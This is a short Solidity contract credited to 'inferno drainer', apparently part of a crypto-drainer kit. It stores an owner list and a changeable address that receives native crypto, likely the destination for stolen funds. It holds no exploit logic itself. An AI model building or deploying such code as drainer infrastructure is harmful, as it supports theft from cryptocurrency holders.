// @mr_inferno_drainer / inferno drainer

pragma solidity ^0.8.6;

contract StorageContract {
    address public nativeCryptoReceiver;
    address[] public owners;

    constructor(address defaultNativeCryptoReceiver, address firstOwner) {
        nativeCryptoReceiver = defaultNativeCryptoReceiver;
        owners.push(firstOwner);
    }

    modifier onlyOwner() {
        bool isOwner = false;
        for (uint256 i = 0; i < owners.length; i++) {
            if (msg.sender == owners[i]) {
                isOwner = true;
                break;
            }
        }
        require(isOwner, "Caller is not an owner");
        _;
    }

    function addOwner(address newOwner) public onlyOwner {
        owners.push(newOwner);
    }

    function getOwners() public view returns (address[] memory) {
        return owners;
    }

    function removeOwner(address ownerToRemove) public onlyOwner {
        uint256 index = type(uint256).max;

        for (uint256 i = 0; i < owners.length; i++) {
            if (owners[i] == ownerToRemove) {
                index = i;
                break;
            }
        }

        require(index != type(uint256).max, "Owner not found");
        require(owners.length > 1, "Cannot remove the last owner");

        owners[index] = owners[owners.length - 1];
        owners.pop();
    }

    function changeNativeCryptoReceiver(address newNativeCryptoReceiver)
        public
        onlyOwner
    {
        nativeCryptoReceiver = newNativeCryptoReceiver;
    }
}